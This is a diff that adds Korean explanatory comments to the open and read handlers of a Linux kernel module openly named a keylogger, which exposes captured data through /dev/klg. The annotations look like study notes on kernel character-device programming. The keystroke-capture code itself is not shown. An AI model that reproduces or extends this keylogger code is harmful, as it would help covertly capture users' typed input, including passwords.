@@ -34,33 +34,34 @@ void klg_exit(void) {
 
 }
 
-int klg_open(struct inode *inode, struct file *filp) {
+// 참조 http://www.makelinux.net/ldd3/images/0596005903/figs/ldr3_0302.gif
+int klg_open(struct inode *inode, struct file *filp) {	// kernel 프로그래밍 시 필요한 .open 에 할당될 함수로 로그만 남기고 아무것도 안함
 
-	printk(KERN_DEBUG "[Key logger]: Opening device\n");
+	printk(KERN_DEBUG "[Key logger]: Opening device\n");	// 커널 로그 남김
 	return 0;
 }
 
-ssize_t klg_read(struct file *filp, char __user *buf, size_t count, loff_t *f_pos) { 
+ssize_t klg_read(struct file *filp, char __user *buf, size_t count, loff_t *f_pos) { // kernel 프로그래밍 시 필요한 .read 에 할당 될 함수
 
-	printk(KERN_DEBUG "[Key logger]: Reading /dev/klg\n");
+	printk(KERN_DEBUG "[Key logger]: Reading /dev/klg\n");	// 커널 로그 생성
 
 	char* p = buffer;
 	int bytes = 0;
 
-	while(*p != '\0') {
+	while(*p != '\0') {	// 버퍼 크기 조사하는 함수로 보임
 		bytes++;
 		p++;
 	}
 
-	printk(KERN_DEBUG "[Key logger]: Reading %d bytes\n", bytes);
+	printk(KERN_DEBUG "[Key logger]: Reading %d bytes\n", bytes);	// 커널 로그 생성
 
-	if(bytes == 0 || *f_pos) return 0;
+	if(bytes == 0 || *f_pos) return 0;	// 버퍼 크기가 0일 경우 0 반환
 
-	int ret = copy_to_user(buf, buffer, bytes);
+	int ret = copy_to_user(buf, buffer, bytes);	// buf 유저에게 buffer 를 bytes 값만큼 보냄
 
-	if(ret) {
-		printk(KERN_DEBUG "[Key logger]: Can't copy to user space buffer\n");
-		return -EFAULT;
+	if(ret) {	// 실패시
+		printk(KERN_DEBUG "[Key logger]: Can't copy to user space buffer\n");	// 로그 찍기
+		return -EFAULT;	// #define EFAULT  14  /* Bad address */   from error.h
 	}
 
 	*f_pos = 1;
